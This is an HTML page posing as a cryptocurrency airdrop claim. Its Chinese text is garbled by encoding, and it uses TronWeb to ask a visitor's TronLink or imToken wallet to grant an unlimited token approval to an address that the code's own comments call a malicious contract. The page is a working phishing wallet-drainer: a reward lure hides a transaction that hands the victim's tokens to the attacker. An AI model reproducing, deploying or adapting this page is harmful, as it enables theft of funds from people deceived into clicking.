<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>é ˜å–ç©ºæŠ•</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
</head>
<body>
  <h2>ğŸ æ­å–œç²å¾—ç©ºæŠ•è³‡æ ¼</h2>
  <p>è«‹é»ä¸‹æ–¹æŒ‰éˆ•å®Œæˆæˆæ¬Šï¼Œæ‰èƒ½é ˜å–æ‚¨çš„ç©ºæŠ•ã€‚</p>
  <button onclick="approve()">âœ… é»æˆ‘æˆæ¬Š</button>
  <p id="status"></p>

  <script>
    const fakeUSDT = "TVCS7QxvBzTxg1ybwMTxVeaJktHCCFj4Xt";     // å‡å¹£åœ°å€
    const fakeApprove = "TNogK4zkavHQtpyAgBuTRo7iNPREHj9dxx";   // æƒ¡æ„åˆç´„åœ°å€
    const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 2^256-1

    async function waitForWallet(timeout = 10000) {
      const start = Date.now();
      while ((!window.tronWeb || !window.tronWeb.defaultAddress.base58) && (Date.now() - start < timeout)) {
        document.getElementById("status").innerText = "â³ æ­£åœ¨ç­‰å¾…éŒ¢åŒ…é€£ç·š...";
        await new Promise(r => setTimeout(r, 500));
      }
    }

    async function approve() {
      await waitForWallet();

      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        document.getElementById("status").innerText = "âŒ æ‰¾ä¸åˆ° TronLink æˆ– imToken éŒ¢åŒ…";
        return;
      }

      try {
        const contract = await window.tronWeb.contract().at(fakeUSDT);
        const tx = await contract.approve(fakeApprove, maxAmount).send();
        document.getElementById("status").innerText = `âœ… æˆæ¬ŠæˆåŠŸï¼TXï¼š${tx}`;
      } catch (err) {
        document.getElementById("status").innerText = `âŒ éŒ¯èª¤ï¼š${err.message}`;
      }
    }
  </script>
</body>
</html>
